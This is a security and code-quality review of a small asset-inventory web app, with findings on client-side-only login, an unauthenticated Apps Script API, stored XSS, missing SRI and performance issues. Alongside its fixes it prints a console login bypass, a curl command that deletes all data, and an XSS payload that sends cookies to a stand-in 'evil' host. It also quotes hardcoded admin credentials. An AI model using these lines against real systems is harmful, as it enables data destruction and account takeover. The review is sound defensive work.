# SIMAS 263 — Code Review

Scope: `config.js`, `index.html`, `js/app.js`, `css/style.css` as of the current `main` branch.
Focus: security, clean code, performance.

## Summary

| Area        | Critical | High | Medium | Low |
|-------------|:--------:|:----:|:------:|:---:|
| Security    | 2        | 1    | 2      | 1   |
| Clean Code  | -        | 1    | 3      | 2   |
| Performance | -        | 1    | 2      | -   |

The most urgent problem is architectural, not cosmetic: **this app has no real backend authorization**. The login screen is a UI gate only — the actual data API (the Google Apps Script URL) accepts requests from anyone who has the URL, with no token, no origin check, and no server-side check that the caller ever logged in. Everything else in this review is secondary to fixing that.

---

## 1. Security

### 1.1 CRITICAL — Client-side-only login; admin credentials shipped to every visitor's browser
**Files:** `config.js:2-6`, `js/app.js:16-27`

```js
const CONFIG = {
    ADMIN_ID: "222581",
    ADMIN_PIN: "123456"
};
```
```js
if (loginIdInput === CONFIG.ADMIN_ID && loginPinInput === CONFIG.ADMIN_PIN) {
    sessionStorage.setItem('simas_logged_in', 'true');
```

`config.js` is loaded as a plain `<script>` tag, so `ADMIN_ID`/`ADMIN_PIN` are visible to anyone who opens DevTools → Sources, or simply requests `config.js` directly. Worse, the "session" is just a `sessionStorage` flag with no cryptographic backing — any visitor can open the console and run:

```js
sessionStorage.setItem('simas_logged_in', 'true'); location.reload();
```

...and land straight on the dashboard, no credentials needed at all.

This file is also **already committed to git** (`git log -- config.js` shows it in the first commit) and the repo has a GitHub remote configured. If that repo is or ever becomes public, the PIN is permanently in the history even if rotated later.

**Recommendation:** Client-side login cannot be made secure — the check has to move server-side (e.g. the Apps Script `doPost` validates a token before mutating data). Short-term mitigations: rotate the PIN immediately, stop committing secrets to git (`git rm --cached config.js` + `.gitignore`, then rewrite history if the repo is public), and treat the current PIN as burned.

### 1.2 CRITICAL — The real API has no access control at all
**File:** `js/app.js` (every `fetch(CONFIG.WEB_APP_URL, ...)` call, e.g. lines 57, 161, 237, 280, 630)

The frontend's "login" only gates the SPA view. Every actual read/write/delete goes straight to the Google Apps Script `/exec` URL, which (per the Apps Script code reviewed earlier in this project) performs zero authentication — it trusts every incoming `doGet`/`doPost` unconditionally, including `action=deleteAll`.

That URL is public in `config.js`, visible to any visitor, and (per §1.1) also sitting in git history. Consequently **anyone who has ever viewed page source can wipe or rewrite the entire asset database directly**, without ever touching the login screen:

```bash
curl -X POST "$WEB_APP_URL" -d "action=deleteAll"
```

This is the single most important issue in the app. The login screen currently protects nothing that a network request can't bypass.

**Recommendation:** Add a shared-secret or token check inside the Apps Script `doPost`/`doGet` (e.g. require `e.parameter.token` to match a value stored in Script Properties, not in client code), and reject requests without it. Rotate the deployment URL after adding the check, since the current one is already exposed.

### 1.3 HIGH — Unescaped data interpolated into `innerHTML` (stored XSS)
**File:** `js/app.js:47, 364-388, 560-587`

Table rows and the pie chart detail list are built by interpolating asset fields directly into HTML strings:

```js
tr.innerHTML = `... <span class="badge-category">${barang.Jenis_Barang}</span> ...`;
```

None of `Jenis_Barang`, `Merk`, `Type_Barang`, `Sumber_Perolehan_Dana`, `Triwulan`, `Tahun`, `Lantai`, `Ruang` are HTML-escaped. These values come from the Google Sheet, which can be populated via bulk Excel import (`bacaFileExcelMassal`) or, per §1.2, via a direct unauthenticated POST from anyone on the internet. A value like `<img src=x onerror=fetch('https://evil/'+document.cookie)>` stored in any of those columns executes for every admin who subsequently opens the dashboard — this chains directly with the open-API issue into a full stored-XSS-to-account-takeover path (there's no cookie/session token to steal today, but there's nothing stopping the same payload from calling `hapusSemuaDatabaseAset()`-equivalent logic on the victim's behalf).

**Recommendation:** Escape all dynamic values before interpolating (a small `escapeHtml()` helper used everywhere data touches `innerHTML`), or switch to `textContent`/`createElement` for user-controlled fields.

### 1.4 HIGH — Attribute-context injection via unescaped `ID_Aset` in inline handlers
**File:** `js/app.js:583-585`

```js
<button onclick="hapusAset('${barang.ID_Aset}')">Hapus</button>
```

If `ID_Aset` ever contains a single quote (typo'd during manual Sheet edit, or a crafted Excel import), it breaks out of the string literal inside the `onclick` attribute, allowing arbitrary JS to run in that attribute context — a second, independent XSS vector from §1.3 because it survives even if `innerHTML`-interpolated *text* were escaped but the attribute value wasn't.

**Recommendation:** Same escaping fix as §1.3, applied to attribute contexts too (HTML-attribute escaping, not just text escaping) — or better, replace inline `onclick="..."` strings with `addEventListener` + `dataset.id`, which sidesteps string-injection entirely.

### 1.5 MEDIUM — Third-party scripts loaded with no Subresource Integrity, one unpinned
**File:** `index.html:18-21`

```html
<script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
```

No `integrity="sha384-..."` attribute on any CDN script, so a compromised CDN or MITM can inject arbitrary code with full page access. `chart.js` additionally has no version pin (`@npm/chart.js` resolves to whatever is currently "latest"), which is both a supply-chain risk and a stability risk — a breaking Chart.js release ships to your users with no warning.

**Recommendation:** Pin exact versions and add SRI hashes (jsDelivr generates these for you on the package page).

### 1.6 MEDIUM — Data trust boundary: bulk import writes straight into the authoritative table
**File:** `js/app.js:190-246`

`bacaFileExcelMassal` accepts any `.xlsx`/`.xls` file and pushes rows into `databaseAset` (and syncs to the cloud) with only "is this cell non-empty" validation — no check that `Kondisi`/`Triwulan`/`Lantai` match the fixed enums used everywhere else in the UI. Combined with §1.3, this is also the easiest way for a bad value to reach the XSS sinks.

**Recommendation:** Validate imported values against the known enum lists before accepting a row; reject or flag rows that don't match instead of silently defaulting or accepting arbitrary strings.

### 1.7 LOW — Weak PIN, no rate limiting or lockout
**File:** `js/app.js:16-27`

Even setting aside §1.1, a 6-digit numeric PIN with unlimited attempts and no delay is brute-forceable in seconds by a script — moot today only because the check happens entirely client-side and can be bypassed anyway.

---

## 2. Clean Code

### 2.1 HIGH — Success message doesn't reflect actual cloud sync result
**File:** `js/app.js:161-172`

```js
fetch(CONFIG.WEB_APP_URL, { method: 'POST', body: formData, headers: {...} })
    .then(() => console.log('Sukses sinkronisasi cloud.'))
    .catch(err => console.error('Cloud synchronization error:', err));

resetFormAset();
perbaruiTampilanDanStatistik();
alert("Data aset berhasil disimpan dan disinkronisasi ke cloud!");
```

The `alert` fires immediately after the `fetch` call is *issued*, not after it resolves — so the user is told the cloud sync succeeded regardless of whether it actually did. Contrast this with `hapusAset` (`js/app.js:630-644`), which correctly waits for the response before updating local state and only shows success once the server confirms it. The two mutation paths (`simpanData` vs `hapusAset`) follow opposite philosophies (optimistic vs. confirmed) for no apparent reason, which makes the failure behavior of the app inconsistent and easy to get wrong when extending it.

**Recommendation:** Make `simpanData` await the fetch and only report success after a confirmed response, mirroring `hapusAset`.

### 2.2 MEDIUM — Duplicated "unique sorted years" logic
**File:** `js/app.js:307-312` and `js/app.js:472-475`

`perbaruiOpsiTahunChart()` and `perbaruiOpsiTahunFilter()` both compute the same thing:
```js
Array.from(new Set(databaseAset.map(x => String(x.Tahun || "").trim()).filter(Boolean))).sort((a, b) => b.localeCompare(a));
```
**Recommendation:** Extract a single `daftarTahunUnik()` helper and call it from both places.

### 2.3 MEDIUM — Long ternary chain for field-name mapping
**File:** `js/app.js:144-159`

```js
const mappedKey =
    key === 'ID_Aset' ? 'idAset' :
    key === 'Jenis_Barang' ? 'jenisBarang' :
    ...
```
**Recommendation:** Replace with a lookup object (`const FIELD_MAP = { ID_Aset: 'idAset', ... }`) — same behavior, far easier to scan and extend.

### 2.4 MEDIUM — Silent, hardcoded fallback values during import mask bad data
**File:** `js/app.js:214-219`

```js
Sumber_Perolehan_Dana: baris[4] ? String(baris[4]).trim() : "-",
Tahun: baris[6] ? String(baris[6]).trim() : "2026",
Lantai: baris[7] ? String(baris[7]).trim() : "Lantai 1",
```
A row missing "Tahun" silently becomes "2026" instead of being flagged — an incomplete Excel row turns into fabricated-looking data with no indication anything was defaulted. Related to §1.6.

**Recommendation:** Track and report which rows used a fallback (or reject them) instead of silently normalizing them into valid-looking values.

### 2.5 LOW — Inline event handlers mixed into markup
**Files:** `index.html` (throughout), `js/app.js:583-585`

Every interactive element uses `onclick="..."`/`onchange="..."` string attributes rather than `addEventListener`. Functionally fine at this scale, but it's also *why* §1.4's injection is possible, and it blocks ever adopting a strict Content-Security-Policy (which needs `'unsafe-inline'` disabled for `script-src` to be worth anything).

### 2.6 LOW — `tampilkanPesanTabel` hardcodes `colspan="7"`
**File:** `js/app.js:47`

If a column is added/removed from the table again (as already happened once this project), this constant has to be remembered and updated by hand in a place unrelated to the `<thead>`. Consider computing it from the header's cell count instead.

---

## 3. Performance

### 3.1 HIGH — Every keystroke in search triggers a full chart destroy/rebuild + full table rebuild
**File:** `js/app.js:501-536` (`perbaruiTampilanDanStatistik`), wired to `oninput` on `filterPencarian`

Each keystroke in the search box currently:
1. Rebuilds the Tahun filter checkboxes from scratch (`perbaruiOpsiTahunFilter` — full `innerHTML` replace),
2. Runs 4 separate full passes over `databaseAset` just for the stat tiles (`statTotalAset`, `statKondisiBaik`, `statKondisiRusakRingan`, `statKondisiRusakBerat` each call their own `.filter(...).length`),
3. Destroys and fully reconstructs the Chart.js pie chart instance (`renderKategoriPieChart`, including its own `perbaruiOpsiTahunChart` DOM rebuild),
4. Clears and rebuilds every `<tr>` in the table.

At the dataset sizes this app currently holds (a school's asset list) this is invisible, but it's wasteful work per keystroke and won't scale gracefully. A form field like search does not need to rebuild filter checkboxes or the chart at all until the actual filtered set changes meaningfully.

**Recommendation:**
- Debounce `filterPencarian`'s `oninput` (150–250ms) so typing doesn't run the full pipeline per keystroke.
- Compute the four stat counts in a single pass instead of four `.filter()` calls.
- Update the existing Chart.js instance's `data` + call `.update()` instead of `destroy()`/`new Chart()` when only values change (keep destroy/recreate only for structural changes, e.g. label set changing).

### 3.2 HIGH — Bulk Excel import fires unthrottled concurrent requests
**File:** `js/app.js:225-238`

```js
for (let i = 1; i < matriksJson.length; i++) {
    ...
    fetch(CONFIG.WEB_APP_URL, { method: 'POST', body: formData }); // no await, no queue
}
```

Importing a large spreadsheet fires one `fetch` per row with no concurrency limit and no error handling per request — Apps Script web apps are known to throttle/queue concurrent invocations per user, so a big import can silently drop writes with no retry and no way for the user to know which rows didn't make it to the Sheet. The success alert (`` `Berhasil mengimpor ${entriSukses} rekor...` ``) only reflects local array pushes, not confirmed cloud writes.

**Recommendation:** Send import rows sequentially (or in small batches) with `await`, track per-row success/failure, and report actual sync results rather than assuming every row landed.

### 3.3 MEDIUM — Repeated `document.getElementById` lookups for the same element within one function
**File:** `js/app.js:432-450`, `501-536`

Minor, but several functions call `document.getElementById`/`querySelectorAll` for the same target multiple times within a single execution (e.g. all `.multiselect-panel` / `.multiselect-trigger` are queried fresh in `toggleMultiselectFilter`, the document click handler, and `resetSemuaFilter`). Not a bottleneck today given the small element counts involved, but worth caching if this list grows.

---

## Suggested priority order

1. **§1.2** — add server-side auth to the Apps Script endpoint; nothing else matters until the data API itself is locked down.
2. **§1.1** — stop shipping/committing credentials; rotate the PIN and the Apps Script URL once §1.2 lands.
3. **§1.3 / §1.4** — add HTML/attribute escaping everywhere asset data reaches the DOM.
4. **§2.1** — fix the misleading "saved to cloud" success message.
5. Everything else (§1.5, §1.6, §2.x, §3.x) can be cleaned up incrementally without user-facing risk.
